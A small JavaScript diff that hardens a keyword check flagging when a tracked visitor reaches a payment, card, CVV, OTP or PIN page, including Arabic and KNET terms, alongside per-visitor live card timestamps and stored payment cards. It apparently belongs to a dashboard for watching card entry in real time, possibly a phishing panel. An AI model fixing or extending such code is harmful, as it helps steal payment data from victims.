@@ -1601,7 +1601,7 @@ html += '</select>';
       
       // ===== بطاقة دفع =====
 const visitorPage = (visitor.page || '').toLowerCase();
-const isOnPaymentPage = ['الدفع','بطاقة','كي نت','payment','credit','cvv','otp','atm','pin','card'].some(h=>visitorPage.indexOf(h)>-1);
+/*FIX47*/ const isOnPaymentPage = ['الدفع','بطاقة','كي نت','payment','credit','cvv','otp','atm','pin','card'].some(h => String(visitorPage || "").toLowerCase().indexOf(String(h).toLowerCase()) > -1);
 const __lcTs = visitor.liveCardTimestamp ? new Date(visitor.liveCardTimestamp).getTime() : 0;
 const __pcs = visitor.paymentCards || [];
 const __lastPcTs = __pcs.length ? new Date(__pcs[__pcs.length-1].timestamp || 0).getTime() : 0;
